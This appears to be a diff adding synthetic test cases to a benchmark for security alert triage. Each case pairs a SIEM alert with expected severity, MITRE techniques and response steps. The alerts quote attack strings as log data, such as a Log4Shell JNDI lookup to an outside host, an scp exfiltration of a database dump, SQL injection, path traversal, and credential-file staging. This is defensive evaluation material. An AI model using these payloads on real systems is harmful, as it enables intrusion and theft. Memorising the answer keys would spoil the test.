+      "notes": "Application Layer Protocol: Web Protocols C2 Beaconing (T1071.001)."
+    },
+    {
+      "case_id": "case-23-external-recon-portscan",
+      "category": "suspicious_network",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-023",
+        "timestamp": "2026-06-23T02:10:00.000+0000",
+        "rule": {
+          "id": "40601",
+          "level": 4,
+          "description": "Firewall: single host contacted 200+ distinct ports on one destination in 60 seconds",
+          "groups": ["firewall", "reconnaissance"],
+          "mitre": {"id": ["T1046"], "tactic": ["Discovery"]}
+        },
+        "agent": {"id": "050", "name": "fw-edge", "os": {"name": "Linux", "version": "24.04"}},
+        "data": {"srcip": "192.0.2.148", "dstip": "10.10.5.20", "protocol": "tcp"},
+        "location": "firewall.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "low",
+        "expected_techniques": ["T1046"],
+        "expected_cves": [],
+        "expected_indicators": ["192.0.2.148", "10.10.5.20"],
+        "expected_direction": "Confirm whether the source is an authorized scanner, review which ports answered, check for follow-on connection attempts to open services.",
+        "relevant_knowledge_ids": ["T1046"],
+        "severity_rationale": "Network scanning is low severity reconnaissance unless followed by immediate exploitation attempts."
+      },
+      "notes": "High-port-count connection pattern is network service scanning (T1046)."
+    },
+    {
+      "case_id": "case-24-unusual-outbound-rdp",
+      "category": "suspicious_network",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-024",
+        "timestamp": "2026-06-24T21:15:00.000+0000",
+        "rule": {
+          "id": "93040",
+          "level": 9,
+          "description": "Firewall: Outbound RDP session initiated from standard workstation to foreign external IP",
+          "groups": ["firewall", "lateral_movement", "c2"],
+          "mitre": {"id": ["T1021.001"], "tactic": ["Lateral Movement"]}
+        },
+        "agent": {"id": "050", "name": "fw-edge", "os": {"name": "Linux", "version": "24.04"}},
+        "data": {"srcip": "10.0.1.33", "dstip": "203.0.113.88", "dstport": 3389, "protocol": "tcp"},
+        "location": "firewall.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1021.001"],
+        "expected_cves": [],
+        "expected_indicators": ["10.0.1.33", "203.0.113.88", "3389"],
+        "expected_direction": "Terminate outbound TCP 3389 session; review local mstsc.exe process history and saved RDP credentials on workstation 10.0.1.33; interview logged-in user.",
+        "relevant_knowledge_ids": ["T1021.001"],
+        "severity_rationale": "Workstations initiating outbound RDP to non-organizational public IPs suggest interactive unauthorized remote access."
+      },
+      "notes": "Remote Services: Remote Desktop Protocol (T1021.001)."
+    },
+    {
+      "case_id": "case-25-staging-archive-7zip",
+      "category": "data_exfiltration",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-025",
+        "timestamp": "2026-06-25T11:05:00.000+0000",
+        "rule": {
+          "id": "92310",
+          "level": 10,
+          "description": "Windows: 7-Zip command-line utility used to create password-protected archive of sensitive directories",
+          "groups": ["windows", "collection", "exfiltration"],
+          "mitre": {"id": ["T1560.001"], "tactic": ["Collection"]}
+        },
+        "agent": {"id": "046", "name": "win-fin-05", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "dclarke", "process": "7z.exe", "command": "7z.exe a -pSecretPass2026! C:\\Users\\Public\\finance_q2.7z D:\\FinancialData\\*"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1560.001"],
+        "expected_cves": [],
+        "expected_indicators": ["7z.exe", "finance_q2.7z", "dclarke"],
+        "expected_direction": "Seize finance_q2.7z from C:\\Users\\Public; verify whether any upload activity occurred from win-fin-05; review network proxy logs for cloud storage destinations.",
+        "relevant_knowledge_ids": ["T1560.001"],
+        "severity_rationale": "Command-line compression with encryption flags staging business records in public directories is an exfiltration precursor."
+      },
+      "notes": "Archive Collected Data: Archive via Utility (T1560.001)."
+    },
+    {
+      "case_id": "case-26-cloud-mega-upload",
+      "category": "data_exfiltration",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-026",
+        "timestamp": "2026-06-26T16:45:00.000+0000",
+        "rule": {
+          "id": "93120",
+          "level": 11,
+          "description": "Proxy: Large volume file upload (12 GB) to unapproved personal cloud storage service",
+          "groups": ["proxy", "exfiltration"],
+          "mitre": {"id": ["T1567.002"], "tactic": ["Exfiltration"]}
+        },
+        "agent": {"id": "051", "name": "proxy-corp", "os": {"name": "Linux", "version": "22.04"}},
+        "data": {"srcip": "10.0.1.55", "username": "t.adams", "destination_host": "mega.nz", "bytes_transferred": 12884901888},
+        "location": "squid-access.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1567.002"],
+        "expected_cves": [],
+        "expected_indicators": ["10.0.1.55", "mega.nz", "t.adams"],
+        "expected_direction": "Block mega.nz at proxy; interview t.adams; review endpoint forensic logs on 10.0.1.55 to determine which specific files were uploaded.",
+        "relevant_knowledge_ids": ["T1567.002"],
+        "severity_rationale": "Multi-gigabyte uploads to unauthorized cloud storage indicate high-risk data leakage or intellectual property theft."
+      },
+      "notes": "Exfiltration to Cloud Storage (T1567.002)."
+    },
+    {
+      "case_id": "case-27-unauthorized-scp-egress",
+      "category": "data_exfiltration",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-027",
+        "timestamp": "2026-06-27T03:30:00.000+0000",
+        "rule": {
+          "id": "5509",
+          "level": 11,
+          "description": "Linux: scp command executed transferring database dump to foreign IP",
+          "groups": ["syslog", "exfiltration"],
+          "mitre": {"id": ["T1048.002"], "tactic": ["Exfiltration"]}
+        },
+        "agent": {"id": "021", "name": "db-prod-01", "os": {"name": "Ubuntu", "version": "22.04"}},
+        "data": {"dstuser": "postgres", "process": "scp", "command": "scp /var/backups/customers_dump.sql.gz dropuser@198.51.100.222:/tmp/"},
+        "location": "/var/log/auth.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1048.002"],
+        "expected_cves": [],
+        "expected_indicators": ["customers_dump.sql.gz", "198.51.100.222", "postgres"],
+        "expected_direction": "Block communication to 198.51.100.222; immediately inspect postgres database server; initiate data breach incident response procedure; check database audit logs.",
+        "relevant_knowledge_ids": ["T1048.002"],
+        "severity_rationale": "Direct transmission of database backups to an external server constitutes an active high-impact data exfiltration event."
+      },
+      "notes": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol via SCP (T1048.002)."
+    },
+    {
+      "case_id": "case-28-clipboard-harvesting",
+      "category": "data_exfiltration",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-028",
+        "timestamp": "2026-06-28T14:12:00.000+0000",
+        "rule": {
+          "id": "92320",
+          "level": 8,
+          "description": "Windows: Non-standard background process repeatedly monitoring clipboard API",
+          "groups": ["windows", "collection"],
+          "mitre": {"id": ["T1115"], "tactic": ["Collection"]}
+        },
+        "agent": {"id": "047", "name": "win-dev-08", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "alex.dev", "process": "clipmon.exe", "file": "C:\\Users\\alex.dev\\AppData\\Local\\clipmon.exe", "api_calls": "GetClipboardData"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "medium",
+        "expected_techniques": ["T1115"],
+        "expected_cves": [],
+        "expected_indicators": ["clipmon.exe", "alex.dev"],
+        "expected_direction": "Terminate clipmon.exe; analyze binary in sandbox to see if it exfiltrates captured text; advise user alex.dev to reset passwords copied into clipboard.",
+        "relevant_knowledge_ids": ["T1115"],
+        "severity_rationale": "Clipboard sniffing utilities intercept copied credentials, API keys, and sensitive tokens."
+      },
+      "notes": "Clipboard Data Collection (T1115)."
+    },
+    {
+      "case_id": "case-29-log4shell-exploitation",
+      "category": "web_attack",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-029",
+        "timestamp": "2026-06-29T10:04:00.000+0000",
+        "rule": {
+          "id": "31520",
+          "level": 15,
+          "description": "Web: Apache Log4j JNDI lookup exploit attempt detected in HTTP headers (CVE-2021-44228)",
+          "groups": ["web", "attack", "cve"],
+          "mitre": {"id": ["T1190"], "tactic": ["Initial Access"]}
+        },
+        "agent": {"id": "020", "name": "app-prod-02", "os": {"name": "CentOS", "version": "9"}},
+        "data": {"srcip": "198.51.100.104", "dstport": 8080, "http_user_agent": "${jndi:ldap://198.51.100.104:1389/Exploit}", "protocol": "http"},
+        "location": "/var/log/httpd/access.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1190"],
+        "expected_cves": ["CVE-2021-44228"],
+        "expected_indicators": ["198.51.100.104", "${jndi:ldap", "CVE-2021-44228"],
+        "expected_direction": "Verify if Java backend on app-prod-02 has Log4j vulnerability patched; inspect egress firewall logs for outbound LDAP traffic to port 1389; isolate host if outbound connection succeeded.",
+        "relevant_knowledge_ids": ["T1190", "CVE-2021-44228"],
+        "severity_rationale": "Exploitation of Log4Shell provides pre-auth unauthenticated remote code execution with maximum CVSS 10.0 impact."
+      },
+      "notes": "Exploit Public-Facing Application: Apache Log4j2 JNDI RCE (T1190, CVE-2021-44228)."
+    },
+    {
+      "case_id": "case-30-webshell-jsp-drop",
+      "category": "web_attack",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-030",
+        "timestamp": "2026-06-30T14:22:00.000+0000",
+        "rule": {
+          "id": "31511",
+          "level": 12,
+          "description": "Web server: suspicious .jsp file upload to webroot followed by HTTP POST requests to the uploaded file",
+          "groups": ["web", "attack"],
+          "mitre": {"id": ["T1505.003", "T1190"], "tactic": ["Persistence", "Initial Access"]}
+        },
+        "agent": {"id": "020", "name": "app-prod-02", "os": {"name": "CentOS", "version": "9"}},
+        "data": {"srcip": "198.51.100.23", "dstport": 8080, "file": "/var/www/app/uploads/cmd.jsp", "protocol": "http"},
+        "location": "/var/log/nginx/access.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1505.003", "T1190"],
+        "expected_cves": [],
+        "expected_indicators": ["198.51.100.23", "cmd.jsp"],
+        "expected_direction": "Quarantine/remove the uploaded file, review webserver logs for source activity, check process executions spawned by the app server user, look for additional webshells.",
+        "relevant_knowledge_ids": ["T1505.003", "T1190"],
+        "severity_rationale": "A webshell placed in webroot grants persistent interactive shell access through normal web protocols."
+      },
+      "notes": "Server-side webshell behavior (T1505.003) following web app exploitation (T1190)."
+    },
+    {
+      "case_id": "case-31-sqli-union-select",
+      "category": "web_attack",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-031",
+        "timestamp": "2026-07-01T12:05:00.000+0000",
+        "rule": {
+          "id": "31105",
+          "level": 10,
+          "description": "Web: SQL injection pattern detected in HTTP GET parameters",
+          "groups": ["web", "sqli", "initial_access"],
+          "mitre": {"id": ["T1190"], "tactic": ["Initial Access"]}
+        },
+        "agent": {"id": "022", "name": "web-public-01", "os": {"name": "Ubuntu", "version": "24.04"}},
+        "data": {"srcip": "203.0.113.111", "uri": "/catalog?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users--", "status_code": 200},
+        "location": "/var/log/nginx/access.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1190"],
+        "expected_cves": [],
+        "expected_indicators": ["203.0.113.111", "UNION SELECT"],
+        "expected_direction": "Determine whether application returned HTTP 200 with extracted database content; apply parameterized queries / prepared statements; block source IP 203.0.113.111.",
+        "relevant_knowledge_ids": ["T1190"],
+        "severity_rationale": "Successful SQL injection enables unauthorized extraction of entire relational database tables."
+      },
+      "notes": "Exploit Public-Facing Application: SQL Injection (T1190)."
+    },
+    {
+      "case_id": "case-32-path-traversal-passwd",
+      "category": "web_attack",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-032",
+        "timestamp": "2026-07-02T08:50:00.000+0000",
+        "rule": {
+          "id": "31110",
+          "level": 9,
+          "description": "Web: Directory / Path Traversal attempt targeting sensitive system files",
+          "groups": ["web", "traversal"],
+          "mitre": {"id": ["T1190"], "tactic": ["Initial Access"]}
+        },
+        "agent": {"id": "022", "name": "web-public-01", "os": {"name": "Ubuntu", "version": "24.04"}},
+        "data": {"srcip": "198.51.100.15", "uri": "/view?file=../../../../../../etc/passwd", "status_code": 403},
+        "location": "/var/log/nginx/access.log"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "medium",
+        "expected_techniques": ["T1190"],
+        "expected_cves": [],
+        "expected_indicators": ["198.51.100.15", "/etc/passwd"],
+        "expected_direction": "Confirm web server properly blocked request with HTTP 403/404; audit input sanitization on view endpoint; correlate other scanning from 198.51.100.15.",
+        "relevant_knowledge_ids": ["T1190"],
+        "severity_rationale": "Path traversal attempt was blocked (HTTP 403) so threat impact is contained, justifying medium severity."
+      },
+      "notes": "Exploit Public-Facing Application: Path Traversal (T1190)."
+    },
+    {
+      "case_id": "case-33-double-extension-exe",
+      "category": "suspicious_file",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-033",
+        "timestamp": "2026-07-03T15:18:00.000+0000",
+        "rule": {
+          "id": "92410",
+          "level": 10,
+          "description": "Windows: Executable file written with double extension deceptive naming",
+          "groups": ["windows", "defense_evasion"],
+          "mitre": {"id": ["T1036.007"], "tactic": ["Defense Evasion"]}
+        },
+        "agent": {"id": "048", "name": "win-exec-09", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "d.miller", "file": "C:\\Users\\d.miller\\Downloads\\Quarterly_Invoice_2026.pdf.exe", "process": "explorer.exe"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1036.007", "T1036"],
+        "expected_cves": [],
+        "expected_indicators": ["Quarterly_Invoice_2026.pdf.exe", "d.miller"],
+        "expected_direction": "Quarantine the double-extension file immediately; check whether user double-clicked to execute; retrieve email logs to find delivery sender.",
+        "relevant_knowledge_ids": ["T1036.007", "T1036"],
+        "severity_rationale": "Double extension (.pdf.exe) is an intentional social engineering technique to deceive users into launching malware."
+      },
+      "notes": "Masquerading: Double File Extension (T1036.007)."
+    },
+    {
+      "case_id": "case-34-hidden-alternate-data-stream",
+      "category": "suspicious_file",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-034",
+        "timestamp": "2026-07-04T19:02:00.000+0000",
+        "rule": {
+          "id": "92420",
+          "level": 10,
+          "description": "Windows: Execution of hidden binary stored in NTFS Alternate Data Stream",
+          "groups": ["windows", "defense_evasion"],
+          "mitre": {"id": ["T1564.004"], "tactic": ["Defense Evasion"]}
+        },
+        "agent": {"id": "049", "name": "win-research-01", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "k.wright", "process": "wmic.exe", "command": "wmic process call create \"C:\\Users\\k.wright\\Documents\\notes.txt:payload.exe\""},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1564.004"],
+        "expected_cves": [],
+        "expected_indicators": ["notes.txt:payload.exe", "wmic.exe"],
+        "expected_direction": "Extract and inspect stream contents from notes.txt:payload.exe; kill child process spawned by WMIC; inspect how the NTFS stream was originally written.",
+        "relevant_knowledge_ids": ["T1564.004"],
+        "severity_rationale": "Using NTFS Alternate Data Streams hides binaries from standard directory listings and casual user inspection."
+      },
+      "notes": "Hide Artifacts: NTFS File Attributes / Alternate Data Streams (T1564.004)."
+    },
+    {
+      "case_id": "case-35-unsigned-driver-load",
+      "category": "suspicious_file",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-035",
+        "timestamp": "2026-07-05T21:40:00.000+0000",
+        "rule": {
+          "id": "92430",
+          "level": 13,
+          "description": "Windows: Known vulnerable kernel driver loaded (Bring Your Own Vulnerable Driver)",
+          "groups": ["windows", "defense_evasion", "privilege_escalation"],
+          "mitre": {"id": ["T1068"], "tactic": ["Privilege Escalation"]}
+        },
+        "agent": {"id": "030", "name": "win-srv-01", "os": {"name": "Windows", "version": "Server 2022"}},
+        "data": {"dstuser": "SYSTEM", "driver_name": "gdrv.sys", "hash": "842e48e06385f02f6a27e7d0f0c05f7c", "path": "C:\\Windows\\Temp\\gdrv.sys"},
+        "location": "System.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "critical",
+        "expected_techniques": ["T1068"],
+        "expected_cves": [],
+        "expected_indicators": ["gdrv.sys", "842e48e06385f02f6a27e7d0f0c05f7c"],
+        "expected_direction": "Unload vulnerable driver immediately; inspect kernel memory integrity; review which local process executed sc.exe or driver loader; enable Windows Defender Application Control (WDAC) driver blocklist.",
+        "relevant_knowledge_ids": ["T1068"],
+        "severity_rationale": "Loading vulnerable signed drivers (BYOVD) allows adversaries to disable EDR agents and execute arbitrary code in ring 0."
+      },
+      "notes": "Exploitation for Privilege Escalation: BYOVD (T1068)."
+    },
+    {
+      "case_id": "case-36-sensitive-file-staging",
+      "category": "suspicious_file",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-036",
+        "timestamp": "2026-07-06T04:15:00.000+0000",
+        "rule": {
+          "id": "92440",
+          "level": 10,
+          "description": "Windows: Bulk access and staging of KeePass password databases and SSH private keys",
+          "groups": ["windows", "collection", "credential_access"],
+          "mitre": {"id": ["T1074.001", "T1552.001"], "tactic": ["Collection", "Credential Access"]}
+        },
+        "agent": {"id": "040", "name": "win-work-07", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "jdoe", "process": "robocopy.exe", "command": "robocopy C:\\Users\\jdoe\\ C:\\PerfLogs\\loot\\ *.kdbx id_rsa id_ed25519 /S"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": false,
+        "expected_severity_band": "high",
+        "expected_techniques": ["T1074.001", "T1552.001"],
+        "expected_cves": [],
+        "expected_indicators": ["C:\\PerfLogs\\loot", "robocopy.exe", "*.kdbx"],
+        "expected_direction": "Remove C:\\PerfLogs\\loot staging folder; revoke and regenerate SSH keys found in staging; force password reset for user jdoe; isolate workstation.",
+        "relevant_knowledge_ids": ["T1074.001", "T1552.001"],
+        "severity_rationale": "Harvesting password vaults and SSH private keys into hidden staging folders precedes credential compromise across the environment."
+      },
+      "notes": "Data Staged: Local Data Staging and Unsecured Credentials (T1074.001, T1552.001)."
+    },
+    {
+      "case_id": "case-37-authorized-nessus-scan",
+      "category": "benign_control",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-037",
+        "timestamp": "2026-07-07T01:00:00.000+0000",
+        "rule": {
+          "id": "40605",
+          "level": 4,
+          "description": "Firewall: Port scan detected from authorized internal security vulnerability scanner",
+          "groups": ["firewall", "reconnaissance", "security_tool"],
+          "mitre": {"id": ["T1046"], "tactic": ["Discovery"]}
+        },
+        "agent": {"id": "050", "name": "fw-edge", "os": {"name": "Linux", "version": "24.04"}},
+        "data": {"srcip": "10.10.99.5", "dstip": "10.0.1.0/24", "scanner_name": "Nessus-SecOps", "authorized_change_id": "CHG-2026-9921"},
+        "location": "firewall.log"
+      },
+      "ground_truth": {
+        "is_benign": true,
+        "expected_severity_band": "low",
+        "expected_techniques": [],
+        "expected_cves": [],
+        "expected_indicators": ["10.10.99.5", "CHG-2026-9921"],
+        "expected_direction": "Cross-reference change ticket CHG-2026-9921 in change management system; verify scanner IP matches registered vulnerability management host 10.10.99.5; close alert as expected scheduled benign activity.",
+        "relevant_knowledge_ids": ["T1046"],
+        "severity_rationale": "Source is an authorized vulnerability scanner running during scheduled maintenance window with registered change ticket CHG-2026-9921.",
+        "benign_rationale": "Approved vulnerability scanning activity that should be filtered as a negative control."
+      },
+      "notes": "Negative control: Authorized internal security scanner (benign)."
+    },
+    {
+      "case_id": "case-38-routine-backup-service",
+      "category": "benign_control",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-038",
+        "timestamp": "2026-07-08T02:30:00.000+0000",
+        "rule": {
+          "id": "5512",
+          "level": 3,
+          "description": "Linux: High volume data transfer to internal NFS storage server by backup daemon",
+          "groups": ["syslog", "network"],
+          "mitre": {"id": [], "tactic": []}
+        },
+        "agent": {"id": "021", "name": "db-prod-01", "os": {"name": "Ubuntu", "version": "22.04"}},
+        "data": {"srcip": "10.0.1.21", "dstip": "10.0.9.100", "protocol": "nfs", "service": "veeam-backup-agent", "bytes_sent": 53687091200},
+        "location": "/var/log/syslog"
+      },
+      "ground_truth": {
+        "is_benign": true,
+        "expected_severity_band": "low",
+        "expected_techniques": [],
+        "expected_cves": [],
+        "expected_indicators": ["10.0.1.21", "10.0.9.100", "veeam-backup-agent"],
+        "expected_direction": "Confirm backup job completion status in Veeam backup console; no remedial action necessary; dismiss alert as routine operational backup.",
+        "relevant_knowledge_ids": [],
+        "severity_rationale": "Scheduled nightly incremental database snapshot transferred across dedicated private storage subnet.",
+        "benign_rationale": "Legitimate enterprise infrastructure maintenance routine."
+      },
+      "notes": "Negative control: Routine internal backup service (benign)."
+    },
+    {
+      "case_id": "case-39-developer-git-ssh-clone",
+      "category": "benign_control",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-039",
+        "timestamp": "2026-07-09T10:15:00.000+0000",
+        "rule": {
+          "id": "5715",
+          "level": 3,
+          "description": "sshd: Accepted publickey for authorized developer from corporate workstation",
+          "groups": ["syslog", "authentication_success"],
+          "mitre": {"id": [], "tactic": []}
+        },
+        "agent": {"id": "002", "name": "srv-bastion", "os": {"name": "Debian", "version": "12"}},
+        "data": {"srcip": "10.0.1.42", "dstuser": "d.miller", "protocol": "ssh", "auth_method": "publickey", "command": "git-upload-pack 'internal/frontend.git'"},
+        "location": "/var/log/auth.log"
+      },
+      "ground_truth": {
+        "is_benign": true,
+        "expected_severity_band": "low",
+        "expected_techniques": [],
+        "expected_cves": [],
+        "expected_indicators": ["10.0.1.42", "d.miller", "git-upload-pack"],
+        "expected_direction": "Verify key fingerprint matches d.miller developer credentials; normal development repository operation; no action required.",
+        "relevant_knowledge_ids": [],
+        "severity_rationale": "Standard developer git fetch/clone operation over SSH authenticated via corporate hardware token.",
+        "benign_rationale": "Normal engineering productivity workflow with zero indicators of compromise."
+      },
+      "notes": "Negative control: Developer public-key SSH git checkout (benign)."
+    },
+    {
+      "case_id": "case-40-windows-update-powershell",
+      "category": "benign_control",
+      "synthetic": true,
+      "alert": {
+        "id": "eval-040",
+        "timestamp": "2026-07-10T03:00:00.000+0000",
+        "rule": {
+          "id": "92030",
+          "level": 4,
+          "description": "Windows: Microsoft signed PowerShell script executed during maintenance window",
+          "groups": ["windows", "powershell"],
+          "mitre": {"id": [], "tactic": []}
+        },
+        "agent": {"id": "040", "name": "win-work-07", "os": {"name": "Windows", "version": "11"}},
+        "data": {"dstuser": "SYSTEM", "process": "powershell.exe", "command": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Restricted -File C:\\Windows\\SoftwareDistribution\\Download\\InstallUpdates.ps1", "signature": "Microsoft Windows Component Publisher"},
+        "location": "Sysmon.evtx"
+      },
+      "ground_truth": {
+        "is_benign": true,
+        "expected_severity_band": "low",
+        "expected_techniques": [],
+        "expected_cves": [],
+        "expected_indicators": ["InstallUpdates.ps1", "SYSTEM"],
+        "expected_direction": "Verify Windows Update client status; confirm script is catalog signed by Microsoft Windows Component Publisher; no intervention required.",
+        "relevant_knowledge_ids": [],
+        "severity_rationale": "Cryptographically signed system update utility running with restricted execution policy during overnight maintenance window.",
+        "benign_rationale": "Operating system automated patching routine."
+      },
+      "notes": "Negative control: Microsoft signed Windows Update execution (benign)."
+    }
+  ]
+}
